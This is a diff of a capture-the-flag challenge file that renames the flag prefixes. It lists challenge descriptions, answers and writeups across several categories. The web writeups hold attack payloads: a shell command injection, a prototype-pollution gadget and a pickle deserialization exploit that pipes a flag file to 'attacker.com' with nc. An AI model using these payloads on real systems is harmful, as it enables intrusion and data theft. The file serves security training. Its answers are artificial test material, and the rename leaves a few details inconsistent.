@@ -872,8 +872,8 @@
     "category": "Cryptography",
     "points": 100,
     "difficulty": "Easy",
-    "description": "An intercepted message was scrambled using an affine cipher $E(x) = (a \\cdot x + b) \\pmod{26}$. Intel indicates $a = 5, b = 8$. Decrypt the ciphertext: 'Wbgx jv qyv ftxa: CYLAB{4ff1n3_c1ph3r_unw0und}'.",
-    "flag": "CYLAB{4ff1n3_c1ph3r_unw0und}",
+    "description": "An intercepted message was scrambled using an affine cipher $E(x) = (a \\cdot x + b) \\pmod{26}$. Intel indicates $a = 5, b = 8$. Decrypt the ciphertext: 'Wbgx jv qyv ftxa: flag{4ff1n3_c1ph3r_unw0und}'.",
+    "flag": "flag{4ff1n3_c1ph3r_unw0und}",
     "file_url": "",
     "hints": [
       {
@@ -888,7 +888,7 @@
     "concept": "Affine Cipher, Modular Arithmetic, CyberChef",
     "cheatsheet": "python3 -c \"import sympy, gmpy2; print(...) \"",
     "badge": "Easy Crypto",
-    "writeup": "1. In CyberChef, select 'Affine Cipher Decode' with slope $a=5$ and intercept $b=8$.\n2. Or calculate manually using Python:\n   ```python\n   c = 'Wbgx jv qyv ftxa: CYLAB{4ff1n3_c1ph3r_unw0und}'\n   # Inverse of 5 mod 26 is 21 since (5*21)%26 == 1\n   inv_a = 21\n   # Letters map back cleanly to recover the plaintext and flag.\n   ```\n3. Flag: `CYLAB{4ff1n3_c1ph3r_unw0und}`"
+    "writeup": "1. In CyberChef, select 'Affine Cipher Decode' with slope $a=5$ and intercept $b=8$.\n2. Or calculate manually using Python:\n   ```python\n   c = 'Wbgx jv qyv ftxa: flag{4ff1n3_c1ph3r_unw0und}'\n   # Inverse of 5 mod 26 is 21 since (5*21)%26 == 1\n   inv_a = 21\n   # Letters map back cleanly to recover the plaintext and flag.\n   ```\n3. Flag: `flag{4ff1n3_c1ph3r_unw0und}`"
   },
   {
     "id": "crypto-8",
@@ -897,7 +897,7 @@
     "points": 300,
     "difficulty": "Medium",
     "description": "The command center broadcasted the same encrypted message $m$ to three independent listening outposts using RSA with public exponent $e = 3$ and different moduli $N_1, N_2, N_3$. Given $(C_1, N_1), (C_2, N_2), (C_3, N_3)$, recover $m$.",
-    "flag": "CYLAB{h4st4d_br04dc4st_crt_r00t}",
+    "flag": "flag{h4st4d_br04dc4st_crt_r00t}",
     "file_url": "",
     "hints": [
       {
@@ -912,7 +912,7 @@
     "concept": "RSA, Chinese Remainder Theorem, Hastad Attack, SageMath",
     "cheatsheet": "python3 -c \"import sympy, gmpy2; print(...) \"",
     "badge": "Medium Crypto",
-    "writeup": "1. Use `sympy.ntheory.modular.crt([N1, N2, N3], [C1, C2, C3])` to compute $C \\pmod{N_1 N_2 N_3}$.\n2. Compute $m = \\text{integer\\_root}(C, 3)[0]$.\n3. Convert integer $m$ to bytes using `long_to_bytes(m)`.\n4. Flag: `CYLAB{h4st4d_br04dc4st_crt_r00t}`"
+    "writeup": "1. Use `sympy.ntheory.modular.crt([N1, N2, N3], [C1, C2, C3])` to compute $C \\pmod{N_1 N_2 N_3}$.\n2. Compute $m = \\text{integer\\_root}(C, 3)[0]$.\n3. Convert integer $m$ to bytes using `long_to_bytes(m)`.\n4. Flag: `flag{h4st4d_br04dc4st_crt_r00t}`"
   },
   {
     "id": "crypto-9",
@@ -921,7 +921,7 @@
     "points": 450,
     "difficulty": "Hard",
     "description": "An SSL v3 legacy server responds with 'Valid PKCS' or 'Invalid PKCS' when decrypting ciphertext $c$. Exploit the million message attack (Bleichenbacher 1998) against RSA PKCS#1 v1.5 to decrypt the premaster secret.",
-    "flag": "CYLAB{bl31ch3nb4ch3r_1998_p4dd1ng_0r4cl3}",
+    "flag": "flag{bl31ch3nb4ch3r_1998_p4dd1ng_0r4cl3}",
     "file_url": "",
     "hints": [
       {
@@ -936,7 +936,7 @@
     "concept": "Bleichenbacher Attack, Padding Oracle, PKCS#1 v1.5, Lattice / Interval Sieve",
     "cheatsheet": "python3 -c \"import sympy, gmpy2; print(...) \"",
     "badge": "Hard Crypto",
-    "writeup": "1. Implement Bleichenbacher's step-by-step interval reduction algorithm:\n   - Step 1: Find initial $s_1 \\ge \\lceil N / 3B \\rceil$ such that $(c \\cdot s_1^e) \\pmod N$ is conforming.\n   - Step 2: Once a conforming $s$ is found, narrow down intervals $[a, b]$.\n   - Step 3: When a single interval remains, compute next $s_i$ directly from boundary formulas.\n2. When interval width narrows to 1, $m$ is completely revealed.\n3. Flag: `CYLAB{bl31ch3nb4ch3r_1998_p4dd1ng_0r4cl3}`"
+    "writeup": "1. Implement Bleichenbacher's step-by-step interval reduction algorithm:\n   - Step 1: Find initial $s_1 \\ge \\lceil N / 3B \\rceil$ such that $(c \\cdot s_1^e) \\pmod N$ is conforming.\n   - Step 2: Once a conforming $s$ is found, narrow down intervals $[a, b]$.\n   - Step 3: When a single interval remains, compute next $s_i$ directly from boundary formulas.\n2. When interval width narrows to 1, $m$ is completely revealed.\n3. Flag: `flag{bl31ch3nb4ch3r_1998_p4dd1ng_0r4cl3}`"
   },
   {
     "id": "crypto-10",
@@ -945,7 +945,7 @@
     "points": 500,
     "difficulty": "Hard",
     "description": "Two distinct TLS messages were encrypted under the same 256-bit AES-GCM key and identical 96-bit IV. Because GHASH is linear over GF($2^{128}$), determine the GHASH authentication subkey $H$ and forge an admin authentication tag.",
-    "flag": "CYLAB{gcm_f0rb1dd3n_gh4sh_k3y_r3c0v3r3d}",
+    "flag": "flag{gcm_f0rb1dd3n_gh4sh_k3y_r3c0v3r3d}",
     "file_url": "",
     "hints": [
       {
@@ -960,7 +960,7 @@
     "concept": "AES-GCM, GHASH, Galois Fields GF(2^128), Forbidden Attack",
     "cheatsheet": "python3 -c \"import sympy, gmpy2; print(...) \"",
     "badge": "Hard Crypto",
-    "writeup": "1. Represent the ciphertext blocks as polynomials in GF($2^{128}$) with reduction polynomial $x^{128} + x^7 + x^2 + x + 1$.\n2. Set up polynomial $P(H) = (\\text{GHASH}_H(C_1) \\oplus T_1) \\oplus (\\text{GHASH}_H(C_2) \\oplus T_2) = 0$.\n3. Factor $P(H)$ using SageMath polynomial root-finding.\n4. With candidate $H$, derive $E_K(J_0) = \\text{GHASH}_H(C_1) \\oplus T_1$.\n5. Forge arbitrary message tags at will.\n6. Flag: `CYLAB{gcm_f0rb1dd3n_gh4sh_k3y_r3c0v3r3d}`"
+    "writeup": "1. Represent the ciphertext blocks as polynomials in GF($2^{128}$) with reduction polynomial $x^{128} + x^7 + x^2 + x + 1$.\n2. Set up polynomial $P(H) = (\\text{GHASH}_H(C_1) \\oplus T_1) \\oplus (\\text{GHASH}_H(C_2) \\oplus T_2) = 0$.\n3. Factor $P(H)$ using SageMath polynomial root-finding.\n4. With candidate $H$, derive $E_K(J_0) = \\text{GHASH}_H(C_1) \\oplus T_1$.\n5. Forge arbitrary message tags at will.\n6. Flag: `flag{gcm_f0rb1dd3n_gh4sh_k3y_r3c0v3r3d}`"
   },
   {
     "id": "forensics-7",
@@ -969,7 +969,7 @@
     "points": 100,
     "difficulty": "Easy",
     "description": "A top-secret image attachment `evidence.dat` refuses to open in any image viewer. Hex dump shows the first 8 bytes were corrupted by an adversary with `DE AD BE EF 00 00 00 00`. Inspect the file structure, restore the legitimate magic bytes, and view the image.",
-    "flag": "CYLAB{m4g1c_byt3s_png_h34d3r_f1x3d}",
+    "flag": "flag{m4g1c_byt3s_png_h34d3r_f1x3d}",
     "file_url": "",
     "hints": [
       {
@@ -984,7 +984,7 @@
     "concept": "Hex Editing, Magic Bytes, PNG Specification, xxd",
     "cheatsheet": "tshark -r capture.pcap -q -z conv,ip",
     "badge": "Easy Forens",
-    "writeup": "1. Run `xxd evidence.dat | head -n 2` to observe the corrupted header and the `IHDR` signature at offset 0x0C.\n2. In `hexedit` or python:\n   ```python\n   with open('evidence.dat', 'rb') as f:\n       data = bytearray(f.read())\n   data[:8] = bytes.fromhex('89504E470D0A1A0A')\n   with open('repaired.png', 'wb') as f:\n       f.write(data)\n   ```\n3. Open `repaired.png` to view the flag rendered on screen.\n4. Flag: `CYLAB{m4g1c_byt3s_png_h34d3r_f1x3d}`"
+    "writeup": "1. Run `xxd evidence.dat | head -n 2` to observe the corrupted header and the `IHDR` signature at offset 0x0C.\n2. In `hexedit` or python:\n   ```python\n   with open('evidence.dat', 'rb') as f:\n       data = bytearray(f.read())\n   data[:8] = bytes.fromhex('89504E470D0A1A0A')\n   with open('repaired.png', 'wb') as f:\n       f.write(data)\n   ```\n3. Open `repaired.png` to view the flag rendered on screen.\n4. Flag: `flag{m4g1c_byt3s_png_h34d3r_f1x3d}`"
   },
   {
     "id": "forensics-8",
@@ -993,7 +993,7 @@
     "points": 250,
     "difficulty": "Medium",
     "description": "An adversary plugged a hardware keystroke logger into an air-gapped terminal. The captured PCAP contains USB HID data packets (`Leftover Capture Data`). Extract the keystrokes to read the typed root password and flag.",
-    "flag": "CYLAB{usb_h1d_k3ystr0k3_p4rs3d}",
+    "flag": "flag{usb_h1d_k3ystr0k3_p4rs3d}",
     "file_url": "",
     "hints": [
       {
@@ -1008,7 +1008,7 @@
     "concept": "Wireshark, USB HID Scancodes, tshark, Keyboard Parsing",
     "cheatsheet": "tshark -r capture.pcap -q -z conv,ip",
     "badge": "Medium Forens",
-    "writeup": "1. Extract USB leftover data using tshark:\n   `tshark -r capture.pcap -Y 'usb.capdata' -T fields -e usb.capdata > data.txt`\n2. Map scancodes with Python script interpreting modifier byte (0x02 = Shift) and scancode byte (index 2).\n3. Reconstructed typed string reveals: `echo CYLAB{usb_h1d_k3ystr0k3_p4rs3d}`\n4. Flag: `CYLAB{usb_h1d_k3ystr0k3_p4rs3d}`"
+    "writeup": "1. Extract USB leftover data using tshark:\n   `tshark -r capture.pcap -Y 'usb.capdata' -T fields -e usb.capdata > data.txt`\n2. Map scancodes with Python script interpreting modifier byte (0x02 = Shift) and scancode byte (index 2).\n3. Reconstructed typed string reveals: `echo flag{usb_h1d_k3ystr0k3_p4rs3d}`\n4. Flag: `flag{usb_h1d_k3ystr0k3_p4rs3d}`"
   },
   {
     "id": "forensics-9",
@@ -1017,7 +1017,7 @@
     "points": 400,
     "difficulty": "Hard",
     "description": "A rogue insider executed `rm -rf /var/log/secure` on an Ext4 partition before taking a raw dd image `disk.img`. The log contained an exfiltrated token. Carve the deleted file using inode pointers and JBD2 filesystem journal logs.",
-    "flag": "CYLAB{3xt4_j0urn4l_und3l3t3_succ3ss}",
+    "flag": "flag{3xt4_j0urn4l_und3l3t3_succ3ss}",
     "file_url": "",
     "hints": [
       {
@@ -1032,7 +1032,7 @@
     "concept": "Ext4 Filesystem, JBD2 Journaling, debugfs, ext4magic",
     "cheatsheet": "tshark -r capture.pcap -q -z conv,ip",
     "badge": "Hard Forens",
-    "writeup": "1. Run `ext4magic disk.img -m -d output_dir/` to parse transaction logs.\n2. Alternatively, dump journal via debugfs: `debugfs -R 'dump <8> journal.copy' disk.img`.\n3. Grep strings inside recovered blocks: `strings output_dir/* | grep 'CYLAB{'`.\n4. Flag: `CYLAB{3xt4_j0urn4l_und3l3t3_succ3ss}`"
+    "writeup": "1. Run `ext4magic disk.img -m -d output_dir/` to parse transaction logs.\n2. Alternatively, dump journal via debugfs: `debugfs -R 'dump <8> journal.copy' disk.img`.\n3. Grep strings inside recovered blocks: `strings output_dir/* | grep 'flag{'`.\n4. Flag: `flag{3xt4_j0urn4l_und3l3t3_succ3ss}`"
   },
   {
     "id": "forensics-10",
@@ -1041,7 +1041,7 @@
     "points": 500,
     "difficulty": "Hard",
     "description": "Intercepted encrypted network traffic contains suspicious TLS 1.3 session handshakes. A memory scraper recovered an NSS `sslkeylog.txt`. Inject the keys into Wireshark, dissect the decrypted HTTP/2 multiplexed streams, and extract the exfiltrated ZIP attachment.",
-    "flag": "CYLAB{tls13_k3yl0g_http2_d3crypt3d}",
+    "flag": "flag{tls13_k3yl0g_http2_d3crypt3d}",
     "file_url": "",
     "hints": [
       {
@@ -1056,7 +1056,7 @@
     "concept": "TLS 1.3, SSLKEYLOGFILE, HTTP/2 Multiplexing, Wireshark Stream Reassembly",
     "cheatsheet": "tshark -r capture.pcap -q -z conv,ip",
     "badge": "Hard Forens",
-    "writeup": "1. Configure tshark with keylog: `tshark -r capture.pcap -o 'tls.keylog_file:sslkeylog.txt' -Y 'http2.data.data' -T fields -e http2.data.data > dumps.hex`.\n2. Locate the stream transferring the zip file (`504b0304`).\n3. Convert hex dump to binary: `xxd -r -p dumps.hex > exfil.zip`.\n4. Unzip `exfil.zip` to read `flag.txt`.\n5. Flag: `CYLAB{tls13_k3yl0g_http2_d3crypt3d}`"
+    "writeup": "1. Configure tshark with keylog: `tshark -r capture.pcap -o 'tls.keylog_file:sslkeylog.txt' -Y 'http2.data.data' -T fields -e http2.data.data > dumps.hex`.\n2. Locate the stream transferring the zip file (`504b0304`).\n3. Convert hex dump to binary: `xxd -r -p dumps.hex > exfil.zip`.\n4. Unzip `exfil.zip` to read `flag.txt`.\n5. Flag: `flag{tls13_k3yl0g_http2_d3crypt3d}`"
   },
   {
     "id": "stego-7",
@@ -1065,7 +1065,7 @@
     "points": 100,
     "difficulty": "Easy",
     "description": "A suspicious JPEG image `vacation.jpg` displays normally in all viewers. However, the file size is 45 KB larger than expected. Inspect bytes located past the JPEG End of Image marker (`FF D9`).",
-    "flag": "CYLAB{30f_tr41l1ng_d4t4_c4rv3d}",
+    "flag": "flag{30f_tr41l1ng_d4t4_c4rv3d}",
     "file_url": "",
     "hints": [
       {
@@ -1080,7 +1080,7 @@
     "concept": "File Signatures, Binwalk, JPEG EOF Marker, Data Carving",
     "cheatsheet": "zsteg -a image.png | grep -E \"CYLAB|flag\"",
     "badge": "Easy Stegan",
-    "writeup": "1. Run `binwalk vacation.jpg` to see an embedded ZIP archive at offset 0x12400.\n2. Extract with `binwalk -e vacation.jpg` or `unzip vacation.jpg`.\n3. Read `secret.txt` from the extracted directory.\n4. Flag: `CYLAB{30f_tr41l1ng_d4t4_c4rv3d}`"
+    "writeup": "1. Run `binwalk vacation.jpg` to see an embedded ZIP archive at offset 0x12400.\n2. Extract with `binwalk -e vacation.jpg` or `unzip vacation.jpg`.\n3. Read `secret.txt` from the extracted directory.\n4. Flag: `flag{30f_tr41l1ng_d4t4_c4rv3d}`"
   },
   {
     "id": "stego-8",
@@ -1089,7 +1089,7 @@
     "points": 250,
     "difficulty": "Medium",
     "description": "An intercepted WAV audio file `voicemail.wav` sounds like a sequence of telephone keypad button beeps. Identify the dual-tone multi-frequency (DTMF) pairs to decode the dialed digits and convert them to ASCII.",
-    "flag": "CYLAB{dtmf_t0n3s_fr3qu3ncy_d14l3d}",
+    "flag": "flag{dtmf_t0n3s_fr3qu3ncy_d14l3d}",
     "file_url": "",
     "hints": [
       {
@@ -1104,7 +1104,7 @@
     "concept": "Audio Steganography, DTMF Tones, Audacity, multimon-ng",
     "cheatsheet": "zsteg -a image.png | grep -E \"CYLAB|flag\"",
     "badge": "Medium Stegan",
-    "writeup": "1. Open `voicemail.wav` in Audacity and switch waveform display to 'Spectrogram'.\n2. Read frequency spikes corresponding to DTMF matrix: 67, 89, 76, 65, 66 ...\n3. Convert decimal pairs to ASCII characters.\n4. Flag: `CYLAB{dtmf_t0n3s_fr3qu3ncy_d14l3d}`"
+    "writeup": "1. Open `voicemail.wav` in Audacity and switch waveform display to 'Spectrogram'.\n2. Read frequency spikes corresponding to DTMF matrix: 67, 89, 76, 65, 66 ...\n3. Convert decimal pairs to ASCII characters.\n4. Flag: `flag{dtmf_t0n3s_fr3qu3ncy_d14l3d}`"
   },
   {
     "id": "stego-9",
@@ -1113,7 +1113,7 @@
     "points": 400,
     "difficulty": "Hard",
     "description": "A public blog post seems to contain only standard English sentences, but character counting utilities report 4,000 extra invisible bytes. Inspect the text for zero-width spaces (`\\u200B`), zero-width non-joiners (`\\u200C`), and zero-width joiners (`\\u200D`).",
-    "flag": "CYLAB{z3r0_w1dth_un1c0d3_st3g4n0}",
+    "flag": "flag{z3r0_w1dth_un1c0d3_st3g4n0}",
     "file_url": "",
     "hints": [
       {
@@ -1128,7 +1128,7 @@
     "concept": "Unicode Steganography, Zero-Width Space, Python Scripting",
     "cheatsheet": "zsteg -a image.png | grep -E \"CYLAB|flag\"",
     "badge": "Hard Stegan",
-    "writeup": "1. Run python script to filter invisible codepoints:\n   ```python\n   text = open('blog.txt', 'r', encoding='utf-8').read()\n   zw = [c for c in text if c in ['\\u200b', '\\u200c']]\n   bits = ''.join(['0' if c == '\\u200b' else '1' for c in zw])\n   flag = ''.join([chr(int(bits[i:i+8], 2)) for i in range(0, len(bits), 8)])\n   print(flag)\n   ```\n2. Output reveals flag.\n3. Flag: `CYLAB{z3r0_w1dth_un1c0d3_st3g4n0}`"
+    "writeup": "1. Run python script to filter invisible codepoints:\n   ```python\n   text = open('blog.txt', 'r', encoding='utf-8').read()\n   zw = [c for c in text if c in ['\\u200b', '\\u200c']]\n   bits = ''.join(['0' if c == '\\u200b' else '1' for c in zw])\n   flag = ''.join([chr(int(bits[i:i+8], 2)) for i in range(0, len(bits), 8)])\n   print(flag)\n   ```\n2. Output reveals flag.\n3. Flag: `flag{z3r0_w1dth_un1c0d3_st3g4n0}`"
   },
   {
     "id": "stego-10",
@@ -1137,7 +1137,7 @@
     "points": 500,
     "difficulty": "Hard",
     "description": "An 8-bit indexed palette GIF file hides secret bytes by swapping adjacent visually identical RGB palette indices. Standard LSB tools like zsteg fail because pixel values themselves are index pointers into the CLUT.",
-    "flag": "CYLAB{clut_p4l3tt3_1nd3x_m0dul4t10n}",
+    "flag": "flag{clut_p4l3tt3_1nd3x_m0dul4t10n}",
     "file_url": "",
     "hints": [
       {
@@ -1152,7 +1152,7 @@
     "concept": "Palette Steganography, GIF CLUT, Pillow Image Analysis, Color Quantization",
     "cheatsheet": "zsteg -a image.png | grep -E \"CYLAB|flag\"",
     "badge": "Hard Stegan",
-    "writeup": "1. Extract palette using PIL: `img.getpalette()` and find duplicate color entries (e.g. indices 12 and 13 both map to `#1a2b3c`).\n2. Iterate through pixel index array `list(img.getdata())`.\n3. When a pixel points to one of the duplicate pairs, extract bit `index % 2`.\n4. Pack bits into bytes to retrieve flag.\n5. Flag: `CYLAB{clut_p4l3tt3_1nd3x_m0dul4t10n}`"
+    "writeup": "1. Extract palette using PIL: `img.getpalette()` and find duplicate color entries (e.g. indices 12 and 13 both map to `#1a2b3c`).\n2. Iterate through pixel index array `list(img.getdata())`.\n3. When a pixel points to one of the duplicate pairs, extract bit `index % 2`.\n4. Pack bits into bytes to retrieve flag.\n5. Flag: `flag{clut_p4l3tt3_1nd3x_m0dul4t10n}`"
   },
   {
     "id": "web-7",
@@ -1161,7 +1161,7 @@
     "points": 100,
     "difficulty": "Easy",
     "description": "A government agency web portal hides its administrative endpoint from search engine crawlers. Inspect standard crawler disclosure files, follow the forbidden directory path, and bypass basic traversal filters.",
-    "flag": "CYLAB{r0b0ts_txt_d1r_tr4v3rs4l_f0und}",
+    "flag": "flag{r0b0ts_txt_d1r_tr4v3rs4l_f0und}",
     "file_url": "",
     "hints": [
       {
@@ -1176,7 +1176,7 @@
     "concept": "robots.txt, Directory Traversal, Burp Suite, Web Recon",
     "cheatsheet": "curl -s -X POST -d \"payload\" target",
     "badge": "Easy Web Ex",
-    "writeup": "1. Curl the robots file: `curl https://target/robots.txt`.\n2. Observe `Disallow: /dev-secret-internal/`.\n3. Request `curl https://target/dev-secret-internal/flag.txt`.\n4. Flag: `CYLAB{r0b0ts_txt_d1r_tr4v3rs4l_f0und}`"
+    "writeup": "1. Curl the robots file: `curl https://target/robots.txt`.\n2. Observe `Disallow: /dev-secret-internal/`.\n3. Request `curl https://target/dev-secret-internal/flag.txt`.\n4. Flag: `flag{r0b0ts_txt_d1r_tr4v3rs4l_f0und}`"
   },
   {
     "id": "web-8",
@@ -1185,7 +1185,7 @@
     "points": 250,
     "difficulty": "Medium",
     "description": "A server network status dashboard allows administrators to ping IP addresses. The input is passed directly to `system('ping -c 1 ' + ip)` without sanitization. Chain shell operators to break out of ping and read `/etc/passwd` and `/flag.txt`.",
-    "flag": "CYLAB{c0mm4nd_1nj3ct10n_p1ng_pwn3d}",
+    "flag": "flag{c0mm4nd_1nj3ct10n_p1ng_pwn3d}",
     "file_url": "",
     "hints": [
       {
@@ -1200,7 +1200,7 @@
     "concept": "Command Injection, Bash Metacharacters, RCE, OWASP Top 10",
     "cheatsheet": "curl -s -X POST -d \"payload\" target",
     "badge": "Medium Web Ex",
-    "writeup": "1. In the ping form input field, enter `127.0.0.1; cat /flag.txt`.\n2. The system executes `ping -c 1 127.0.0.1; cat /flag.txt`.\n3. Server returns ping response followed immediately by the flag contents.\n4. Flag: `CYLAB{c0mm4nd_1nj3ct10n_p1ng_pwn3d}`"
+    "writeup": "1. In the ping form input field, enter `127.0.0.1; cat /flag.txt`.\n2. The system executes `ping -c 1 127.0.0.1; cat /flag.txt`.\n3. Server returns ping response followed immediately by the flag contents.\n4. Flag: `flag{c0mm4nd_1nj3ct10n_p1ng_pwn3d}`"
   },
   {
     "id": "web-9",
@@ -1209,7 +1209,7 @@
     "points": 450,
     "difficulty": "Hard",
     "description": "A cloud settings API accepts user preferences as JSON and merges them recursively using an unpatched deep-clone library. Exploit prototype pollution via `__proto__` to inject gadget properties into `child_process.fork` options, achieving Remote Code Execution.",
-    "flag": "CYLAB{pr0t0typ3_p0llut10n_n0d3_rc3}",
+    "flag": "flag{pr0t0typ3_p0llut10n_n0d3_rc3}",
     "file_url": "",
     "hints": [
       {
@@ -1224,7 +1224,7 @@
     "concept": "Prototype Pollution, Node.js Internals, Gadget Chains, RCE",
     "cheatsheet": "curl -s -X POST -d \"payload\" target",
     "badge": "Hard Web Ex",
-    "writeup": "1. Identify the recursive merge endpoint `/api/settings`.\n2. Send payload: `{\"__proto__\": {\"env\": {\"EVIL\": \"x\"}, \"NODE_OPTIONS\": \"--inspect=0.0.0.0:9229\"}}` or inject a reverse shell via `child_process`.\n3. Trigger background worker execution to spawn subprocess.\n4. Capture the reverse shell flag.\n5. Flag: `CYLAB{pr0t0typ3_p0llut10n_n0d3_rc3}`"
+    "writeup": "1. Identify the recursive merge endpoint `/api/settings`.\n2. Send payload: `{\"__proto__\": {\"env\": {\"EVIL\": \"x\"}, \"NODE_OPTIONS\": \"--inspect=0.0.0.0:9229\"}}` or inject a reverse shell via `child_process`.\n3. Trigger background worker execution to spawn subprocess.\n4. Capture the reverse shell flag.\n5. Flag: `flag{pr0t0typ3_p0llut10n_n0d3_rc3}`"
   },
   {
     "id": "web-10",
@@ -1233,7 +1233,7 @@
     "points": 500,
     "difficulty": "Hard",
     "description": "A session cookie stores a base64-encoded Python `pickle` payload to maintain user shopping carts. Construct a custom `__reduce__` exploit payload that spawns a bash command to read `/root/flag.txt` when deserialized.",
-    "flag": "CYLAB{p1ckl3_d3s3r14l1z4t10n_rc3_pwn}",
+    "flag": "flag{p1ckl3_d3s3r14l1z4t10n_rc3_pwn}",
     "file_url": "",
     "hints": [
       {
@@ -1248,7 +1248,7 @@
     "concept": "Insecure Deserialization, Python Pickle, Reduce Gadget, Privilege Escalation",
     "cheatsheet": "curl -s -X POST -d \"payload\" target",
     "badge": "Hard Web Ex",
-    "writeup": "1. Write exploit script:\n   ```python\n   import pickle, base64, os\n   class Exploit:\n       def __reduce__(self):\n           return (os.system, ('cat /root/flag.txt | nc attacker.com 4444',))\n   payload = base64.b64encode(pickle.dumps(Exploit())).decode()\n   print(payload)\n   ```\n2. Replace the session cookie with `payload` and refresh.\n3. Netcat receives incoming shell connection with the flag.\n4. Flag: `CYLAB{p1ckl3_d3s3r14l1z4t10n_rc3_pwn}`"
+    "writeup": "1. Write exploit script:\n   ```python\n   import pickle, base64, os\n   class Exploit:\n       def __reduce__(self):\n           return (os.system, ('cat /root/flag.txt | nc attacker.com 4444',))\n   payload = base64.b64encode(pickle.dumps(Exploit())).decode()\n   print(payload)\n   ```\n2. Replace the session cookie with `payload` and refresh.\n3. Netcat receives incoming shell connection with the flag.\n4. Flag: `flag{p1ckl3_d3s3r14l1z4t10n_rc3_pwn}`"
   },
   {
     "id": "rev-7",
@@ -1257,7 +1257,7 @@
     "points": 100,
     "difficulty": "Easy",
     "description": "An operator recovered a compiled Python file `auth_check.pyc`. Decompile the bytecode or inspect disassembly to uncover hardcoded password comparison logic.",
-    "flag": "CYLAB{pyc_byt3c0d3_d3c0mp1l3d_34sy}",
+    "flag": "flag{pyc_byt3c0d3_d3c0mp1l3d_34sy}",
     "file_url": "",
     "hints": [
       {
@@ -1272,7 +1272,7 @@
     "concept": "Python Bytecode, pycdc, Disassembly, Decompilation",
     "cheatsheet": "ghidra / gdb-pwndbg ./target",
     "badge": "Easy Revers",
-    "writeup": "1. Run `pycdc auth_check.pyc` or `uncompyle6 auth_check.pyc`.\n2. Decompiled Python source shows:\n   ```python\n   password = input('Enter key: ')\n   if password == 'CYLAB{pyc_byt3c0d3_d3c0mp1l3d_34sy}':\n       print('Access Granted')\n   ```\n3. Flag: `CYLAB{pyc_byt3c0d3_d3c0mp1l3d_34sy}`"
+    "writeup": "1. Run `pycdc auth_check.pyc` or `uncompyle6 auth_check.pyc`.\n2. Decompiled Python source shows:\n   ```python\n   password = input('Enter key: ')\n   if password == 'flag{pyc_byt3c0d3_d3c0mp1l3d_34sy}':\n       print('Access Granted')\n   ```\n3. Flag: `flag{pyc_byt3c0d3_d3c0mp1l3d_34sy}`"
   },
   {
     "id": "rev-8",
@@ -1281,7 +1281,7 @@
     "points": 250,
     "difficulty": "Medium",
     "description": "A Linux ELF binary `license_validator` terminates instantly when opened under GDB with 'Debugger detected! Exiting.'. Bypass the `ptrace(PTRACE_TRACEME, 0, 1, 0)` check by patching the binary or overriding system calls with LD_PRELOAD.",
-    "flag": "CYLAB{ptr4c3_4nt1_d3bug_byp4ss3d}",
+    "flag": "flag{ptr4c3_4nt1_d3bug_byp4ss3d}",
     "file_url": "",
     "hints": [
       {
@@ -1296,7 +1296,7 @@
     "concept": "Anti-Debugging, ptrace, GDB, Binary Patching, x86 Assembly",
     "cheatsheet": "ghidra / gdb-pwndbg ./target",
     "badge": "Medium Revers",
-    "writeup": "1. Open binary in Ghidra or GDB.\n2. Locate `call ptrace` at address 0x401150 followed by `test eax, eax; js exit`.\n3. In GDB: `catch syscall ptrace`, `run`, then `set $rax=0`, `continue`.\n4. Input registration key to generate valid flag verification output.\n5. Flag: `CYLAB{ptr4c3_4nt1_d3bug_byp4ss3d}`"
+    "writeup": "1. Open binary in Ghidra or GDB.\n2. Locate `call ptrace` at address 0x401150 followed by `test eax, eax; js exit`.\n3. In GDB: `catch syscall ptrace`, `run`, then `set $rax=0`, `continue`.\n4. Input registration key to generate valid flag verification output.\n5. Flag: `flag{ptr4c3_4nt1_d3bug_byp4ss3d}`"
   },
   {
     "id": "rev-9",
@@ -1305,7 +1305,7 @@
     "points": 450,
     "difficulty": "Hard",
     "description": "A crackme binary `matrix_hasher` processes a 32-character input through 100 complex linear matrix multiplications and bitwise shuffles before comparing against target hashes. Writing a manual solver is tedious. Automate solving using Angr symbolic execution.",
-    "flag": "CYLAB{4ngr_symb0l1c_smt_s0lv3d}",
+    "flag": "flag{4ngr_symb0l1c_smt_s0lv3d}",
     "file_url": "",
     "hints": [
       {
@@ -1320,7 +1320,7 @@
     "concept": "Angr, Symbolic Execution, SMT Solvers, Z3",
     "cheatsheet": "ghidra / gdb-pwndbg ./target",
     "badge": "Hard Revers",
-    "writeup": "1. Write Angr script:\n   ```python\n   import angr, claripy\n   proj = angr.Project('./matrix_hasher')\n   flag_chars = [claripy.BVS(f'c_{i}', 8) for i in range(32)]\n   flag = claripy.Concat(*flag_chars)\n   state = proj.factory.entry_state(stdin=flag)\n   simgr = proj.factory.simulation_manager(state)\n   simgr.explore(find=0x401500, avoid=0x401550)\n   found = simgr.found[0]\n   print(found.solver.eval(flag, cast_to=bytes))\n   ```\n2. Solver yields flag.\n3. Flag: `CYLAB{4ngr_symb0l1c_smt_s0lv3d}`"
+    "writeup": "1. Write Angr script:\n   ```python\n   import angr, claripy\n   proj = angr.Project('./matrix_hasher')\n   flag_chars = [claripy.BVS(f'c_{i}', 8) for i in range(32)]\n   flag = claripy.Concat(*flag_chars)\n   state = proj.factory.entry_state(stdin=flag)\n   simgr = proj.factory.simulation_manager(state)\n   simgr.explore(find=0x401500, avoid=0x401550)\n   found = simgr.found[0]\n   print(found.solver.eval(flag, cast_to=bytes))\n   ```\n2. Solver yields flag.\n3. Flag: `flag{4ngr_symb0l1c_smt_s0lv3d}`"
   },
   {
     "id": "rev-10",
@@ -1329,7 +1329,7 @@
     "points": 500,
     "difficulty": "Hard",
     "description": "A proprietary malware agent `agent_vm` runs a custom virtual machine with 8 virtual registers, an internal stack, and 16 custom opcodes. Reverse engineer the VM dispatch loop, disassemble the embedded bytecode program, and invert the encryption routine.",
-    "flag": "CYLAB{cust0m_vm_byt3c0d3_d1s4ss3mbl3d}",
+    "flag": "flag{cust0m_vm_byt3c0d3_d1s4ss3mbl3d}",
     "file_url": "",
     "hints": [
       {
@@ -1344,7 +1344,7 @@
     "concept": "VM Disassembly, Bytecode Reversing, Virtual Machine Architecture, Ghidra",
     "cheatsheet": "ghidra / gdb-pwndbg ./target",
     "badge": "Hard Revers",
-    "writeup": "1. Reverse the opcode handlers in Ghidra to map each opcode byte to its semantic operation.\n2. Dump bytecode section from binary `.data`.\n3. Write a Python disassembler that parses instructions and prints human-readable assembly.\n4. Analyze the bytecode algorithm: it performs RC4 key scheduling and XOR with hardcoded key.\n5. Decrypt target memory array to retrieve flag.\n6. Flag: `CYLAB{cust0m_vm_byt3c0d3_d1s4ss3mbl3d}`"
